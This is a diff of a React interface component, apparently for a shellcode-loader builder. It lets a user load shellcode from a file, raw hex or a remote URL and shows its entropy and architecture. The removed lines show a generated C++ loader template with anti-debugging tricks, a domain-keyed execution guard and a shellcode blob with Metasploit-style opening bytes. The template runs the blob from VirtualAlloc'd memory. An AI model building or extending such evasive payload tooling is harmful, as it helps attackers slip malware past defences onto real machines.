@@ -1,13 +1,100 @@
 function FrameWorkspace() {
+  const {
+    useField
+  } = window.washState;
+  const [sourceKind, setSourceKind] = useField('sourceKind');
+  const [shellcodeFile, setShellcodeFile] = useField('shellcodeFileInput');
+  const [shellcodeRaw, setShellcodeRaw] = useField('shellcodeRawInput');
+  const [shellcodeUrl, setShellcodeUrl] = useField('shellcodeUrlValue');
+  const [analysisNonce, setAnalysisNonce] = React.useState(0);
+  const hasFile = !!(shellcodeFile || '').trim();
+  const {
+    useFields
+  } = window.washState;
+  const analysis = useFields('analysis_size', 'analysis_sizeText', 'analysis_arch', 'analysis_entropy', 'analysis_sha256', 'analysis_bytesPreview', 'analysis_running', 'analysis_error');
+  React.useEffect(() => {
+    let active = true;
+    if (sourceKind !== 'file' || !hasFile) {
+      window.washState.update({
+        analysis_size: null,
+        analysis_sizeText: '—',
+        analysis_arch: '—',
+        analysis_entropy: '—',
+        analysis_sha256: '—',
+        analysis_bytesPreview: '',
+        analysis_running: false,
+        analysis_error: ''
+      });
+      return () => {
+        active = false;
+      };
+    }
+    window.washState.update({
+      analysis_running: true,
+      analysis_error: ''
+    });
+    window.wash.invoke('analyze-shellcode', {
+      path: shellcodeFile
+    }).then(r => {
+      if (!active) return;
+      if (!r || !r.ok) {
+        window.washState.update({
+          analysis_running: false,
+          analysis_error: r?.message || 'Analysis failed.'
+        });
+        return;
+      }
+      window.washState.update({
+        analysis_size: r.size,
+        analysis_sizeText: r.sizeText,
+        analysis_arch: r.arch,
+        analysis_entropy: String(r.entropy),
+        analysis_sha256: r.sha256,
+        analysis_bytesPreview: r.bytesPreview || '',
+        analysis_running: false,
+        analysis_error: ''
+      });
+    }).catch(e => {
+      if (active) window.washState.update({
+        analysis_running: false,
+        analysis_error: e.message || 'Analysis failed.'
+      });
+    });
+    return () => {
+      active = false;
+    };
+  }, [shellcodeFile, sourceKind, analysisNonce]);
+  const statusArch = analysis.analysis_arch || '—';
+  const statusSize = analysis.analysis_sizeText || '—';
   const status = [{
     icon: "info",
     k: "src",
-    v: "calc_x64.bin · 327 B"
+    v: sourceKind === 'file' ? hasFile ? (shellcodeFile.split('\\').pop() || shellcodeFile) + (statusSize !== '—' ? ' · ' + statusSize : '') : 'none' : sourceKind
   }, {
     icon: "info",
     k: "arch",
-    v: "x86_64"
+    v: statusArch
   }];
+  const entropyVal = analysis.analysis_entropy ? `${analysis.analysis_entropy} / 8.0` : '—';
+  const entropyHigh = parseFloat(analysis.analysis_entropy) > 7.0;
+  const sha256Short = analysis.analysis_sha256 ? analysis.analysis_sha256.slice(0, 4) + '…' + analysis.analysis_sha256.slice(-4) : '—';
+  function handleBrowse() {
+    window.wash.invoke('browse-file', {
+      filters: [{
+        name: 'Shellcode binary',
+        patterns: ['.bin', '.raw', '.dat']
+      }]
+    }).then(r => {
+      if (r && r.ok && r.path) setShellcodeFile(r.path);
+    }).catch(() => {});
+  }
+  function handleRecompute() {
+    if (hasFile) setAnalysisNonce(n => n + 1);
+  }
+  const hexLines = React.useMemo(() => {
+    const raw = analysis.analysis_bytesPreview || '';
+    return raw.split('\n').filter(Boolean);
+  }, [analysis.analysis_bytesPreview]);
   return React.createElement(Shell, {
     active: "payload",
     crumbs: ["Payload"],
@@ -29,7 +116,8 @@ function FrameWorkspace() {
   }, "Pick one input. Everything downstream rebuilds when this changes.")), React.createElement(Sec, {
     title: "Input mode",
     action: React.createElement(Seg, {
-      value: "file",
+      value: sourceKind,
+      onChange: setSourceKind,
       options: [{
         v: "file",
         l: "File",
@@ -42,13 +130,9 @@ function FrameWorkspace() {
         v: "url",
         l: "URL",
         icon: "globe"
-      }, {
-        v: "test",
-        l: "Test",
-        icon: "beaker"
       }]
     })
-  }, "          ", React.createElement("div", {
+  }, React.createElement("div", {
     className: "card"
   }, React.createElement("div", {
     className: "row",
@@ -63,23 +147,28 @@ function FrameWorkspace() {
       flexDirection: "column",
       gap: 10
     }
-  }, React.createElement(Field, {
+  }, sourceKind === 'file' && React.createElement(React.Fragment, null, React.createElement(Field, {
     label: "Shellcode .bin path"
   }, React.createElement("input", {
     className: "input mono",
-    defaultValue: "C:\\\\Users\\\\hmza\\\\payloads\\\\calc_x64.bin"
+    value: shellcodeFile,
+    onChange: e => setShellcodeFile(e.target.value),
+    placeholder: "C:\\payloads\\shellcode.bin"
   })), React.createElement("div", {
     className: "row",
     style: {
       gap: 8
     }
   }, React.createElement("button", {
-    className: "btn"
+    className: "btn",
+    onClick: handleBrowse
   }, React.createElement(Icon, {
     name: "upload",
     size: 12
   }), "Browse\u2026"), React.createElement("button", {
-    className: "btn ghost"
+    className: "btn ghost",
+    disabled: !hasFile || analysis.analysis_running,
+    onClick: handleRecompute
   }, React.createElement(Icon, {
     name: "refresh",
     size: 12
@@ -87,10 +176,32 @@ function FrameWorkspace() {
     style: {
       flex: 1
     }
-  }), React.createElement(Chip, {
+  }), analysis.analysis_size != null && React.createElement(Chip, {
     kind: "ok",
     dot: true
-  }, "valid PE-stripped"))), React.createElement("div", {
+  }, "analysed"))), sourceKind === 'raw' && React.createElement(React.Fragment, null, React.createElement(Field, {
+    label: "Shellcode hex",
+    hint: "space-separated or continuous hex bytes"
+  }, React.createElement("textarea", {
+    className: "input mono",
+    rows: 4,
+    value: shellcodeRaw,
+    onChange: e => setShellcodeRaw(e.target.value),
+    placeholder: "fc 48 83 e4 f0 e8 c0 00 ...",
+    style: {
+      resize: "vertical",
+      fontFamily: "var(--f-mono)",
+      fontSize: 11
+    }
+  }))), sourceKind === 'url' && React.createElement(React.Fragment, null, React.createElement(Field, {
+    label: "Shellcode URL",
+    hint: "http(s) \u2014 fetched at build time"
+  }, React.createElement("input", {
+    className: "input mono",
+    value: shellcodeUrl,
+    onChange: e => setShellcodeUrl(e.target.value),
+    placeholder: "https://your-server.com/shell.bin"
+  })))), React.createElement("div", {
     style: {
       flex: 1,
       borderLeft: "1px solid var(--n-4)",
@@ -99,7 +210,7 @@ function FrameWorkspace() {
       flexDirection: "column",
       gap: 8
     }
-  }, React.createElement(H3, null, "Detected"), React.createElement("div", {
+  }, React.createElement(H3, null, "Detected"), analysis.analysis_size != null ? React.createElement("div", {
     className: "mono",
     style: {
       fontSize: 11,
@@ -110,40 +221,47 @@ function FrameWorkspace() {
     style: {
       color: "var(--n-10)"
     }
-  }, "327 B"), "\n", "arch      ", React.createElement("span", {
+  }, analysis.analysis_sizeText), "\n", "arch      ", React.createElement("span", {
     style: {
       color: "var(--n-10)"
     }
-  }, "x86_64"), "\n", "entropy   ", React.createElement("span", {
+  }, analysis.analysis_arch), "\n", "entropy   ", React.createElement("span", {
     style: {
       color: "var(--n-10)"
     }
-  }, "7.42 / 8.0"), " ", React.createElement("span", {
+  }, entropyVal), entropyHigh && React.createElement("span", {
     style: {
       color: "var(--warn)"
     }
-  }, "high"), "\n", "sha256    ", React.createElement("span", {
+  }, " high"), "\n", "sha256    ", React.createElement("span", {
     style: {
       color: "var(--n-9)"
     }
-  }, "4f7b\u2026a9d2")))), React.createElement("div", {
+  }, sha256Short)) : React.createElement("div", {
+    className: "mono",
+    style: {
+      fontSize: 11,
+      color: "var(--n-6)",
+      lineHeight: 1.85
+    }
+  }, sourceKind === 'file' ? analysis.analysis_error || (analysis.analysis_running ? 'analysing…' : hasFile ? 'waiting for analysis' : 'no file selected') : 'analysis available for file mode'))), hexLines.length > 0 && React.createElement(React.Fragment, null, React.createElement("div", {
     className: "div"
   }), React.createElement("div", null, React.createElement(H3, null, "First 64 bytes"), React.createElement("div", {
     className: "bytes",
     style: {
       marginTop: 8
     }
-  }, React.createElement("div", null, React.createElement("span", {
-    className: "o"
-  }, "00000000  "), React.createElement("span", {
-    className: "a"
-  }, "fc 48 83 e4"), " f0 e8 c0 00 00 00 41 51 41 50 52 51"), React.createElement("div", null, React.createElement("span", {
-    className: "o"
-  }, "00000010  "), "56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52"), React.createElement("div", null, React.createElement("span", {
-    className: "o"
-  }, "00000020  "), "20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0"), React.createElement("div", null, React.createElement("span", {
-    className: "o"
-  }, "00000030  "), "ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed")))))), React.createElement(PreviewPane, null));
+  }, hexLines.map((line, i) => {
+    const m = line.match(/^([0-9a-f]+)\s+(.*)/);
+    if (!m) return React.createElement("div", {
+      key: i
+    }, line);
+    return React.createElement("div", {
+      key: i
+    }, React.createElement("span", {
+      className: "o"
+    }, m[1], "  "), React.createElement("span", null, m[2]));
+  }))))))), React.createElement(PreviewPane, null));
 }
 function PreviewPane() {
   return React.createElement("div", {
@@ -153,33 +271,9 @@ function PreviewPane() {
   }, React.createElement("div", {
     className: "ptab on"
   }, React.createElement(Icon, {
-    name: "doc",
+    name: "info",
     size: 11
-  }), "source.cpp"), React.createElement("div", {
-    className: "ptab"
-  }, React.createElement(Icon, {
-    name: "layers",
-    size: 11
-  }), "pipeline"), React.createElement("div", {
-    className: "ptab"
-  }, React.createElement(Icon, {
-    name: "term",
-    size: 11
-  }), "console"), React.createElement("div", {
-    style: {
-      flex: 1
-    }
-  }), React.createElement("div", {
-    className: "ptab"
-  }, React.createElement(Icon, {
-    name: "copy",
-    size: 11
-  })), React.createElement("div", {
-    className: "ptab"
-  }, React.createElement(Icon, {
-    name: "dl",
-    size: 11
-  }))), React.createElement("div", {
+  }), "workflow")), React.createElement("div", {
     className: "pbody"
   }, React.createElement("div", {
     style: {
@@ -194,18 +288,14 @@ function PreviewPane() {
       fontSize: 11,
       color: "var(--n-7)"
     }
-  }, "temp/cpp/session_20260519_001a/source.cpp"), React.createElement(Chip, null, "4.1 KB"), React.createElement(Chip, null, "247 lines"), React.createElement("div", {
+  }, "Configure each stage, then run Dry run or Build.")), React.createElement("div", {
     style: {
-      flex: 1
+      padding: "20px 14px",
+      color: "var(--n-6)",
+      fontSize: 12,
+      fontFamily: "var(--f-mono)"
     }
-  }), React.createElement(Chip, {
-    kind: "acc",
-    dot: true
-  }, "auto-rebuild")), React.createElement(CodeBlock, {
-    startLine: 1,
-    highlight: [10, 11, 12],
-    lines: [[["pp", "#define"], ["", " "], ["kw", "WIN32_LEAN_AND_MEAN"]], [["pp", "#include"], ["", " "], ["str", "<windows.h>"]], [["pp", "#include"], ["", " "], ["str", "<tlhelp32.h>"]], [["", ""]], [["cm", "// ── snippet includes ─────────────────"]], [["pp", "#include"], ["", " "], ["str", "<intrin.h>"]], [["", ""]], [["cm", "// ── implementations (anti-debug, ps-inject) ─"]], [["kw", "static"], ["", " "], ["ty", "BOOL"], ["", " "], ["fn", "AntiDbg_CloseHandle"], ["", "()"]], [["", "{ "], ["kw", "__try"], ["", " { "], ["fn", "CloseHandle"], ["", "(("], ["ty", "HANDLE"], ["", ")"], ["num", "0xDEADBEEF"], ["", "); "], ["kw", "return"], ["", " "], ["num", "FALSE"], ["", "; }"]], [["", "  "], ["kw", "__except"], ["", "("], ["num", "EXCEPTION_INVALID_HANDLE"], ["", " == "], ["fn", "GetExceptionCode"], ["", "()"]], [["", "    ? "], ["num", "EXCEPTION_EXECUTE_HANDLER"], ["", " : "], ["num", "EXCEPTION_CONTINUE_SEARCH"], ["", ")"]], [["", "  { "], ["kw", "return"], ["", " "], ["num", "TRUE"], ["", "; } }"]], [["", ""]], [["ty", "INT"], ["", " "], ["fn", "main"], ["", "("], ["ty", "VOID"], ["", ")"]], [["", "{"]], [["", "  "], ["cm", "// {{SHELLCODE_SOURCE}}"]], [["", "  "], ["kw", "static"], ["", " "], ["ty", "unsigned char"], ["", " code_blob[] = {"]], [["", "    "], ["num", "0xfc"], ["", ", "], ["num", "0x48"], ["", ", "], ["num", "0x83"], ["", ", "], ["num", "0xe4"], ["", ", "], ["num", "0xf0"], ["", ", "], ["num", "0xe8"], ["", ", "], ["num", "0xc0"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x41"], ["", ", "], ["num", "0x51"], ["", ","]], [["", "    "], ["fold", "771 bytes folded · click to expand"]], [["", "  };  "], ["cm", "// sizeof = 789"]], [["", "  "], ["ty", "DWORD"], ["", " dwSize = "], ["kw", "sizeof"], ["", "(code_blob);"]], [["", ""]], [["", "  "], ["cm", "// {{GUARDRAILS}}"]], [["", "  "], ["kw", "if"], ["", " ("], ["fn", "GetEnvironmentVariableW"], ["", "("], ["str", "L\"USERDOMAIN\""], ["", ", ..."]], [["", "    .. != "], ["str", "L\"CORP\""], ["", ") "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]], [["", ""]], [["", "  "], ["cm", "// {{ANTI_DEBUGGING}}"]], [["", "  "], ["kw", "if"], ["", " ("], ["fn", "AntiDbg_CloseHandle"], ["", "()) "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]], [["", ""]], [["", "  "], ["cm", "// {{SHELLCODE_EXECUTION}}"]], [["", "  "], ["kw", "void"], ["", "* mem = "], ["fn", "VirtualAlloc"], ["", "("], ["num", "NULL"], ["", ", dwSize, ..."], ["", ");"]], [["", "  "], ["fn", "memcpy"], ["", "(mem, code_blob, dwSize);"]], [["", "  (("], ["kw", "void"], ["", "(*)())mem)();"]], [["", "  "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]], [["", "}"]]]
-  })));
+  }, "File analysis is calculated locally. Build output streams on the Compile and Pipeline pages.")));
 }
 window.FrameWorkspace = FrameWorkspace;
 window.PreviewPane = PreviewPane;
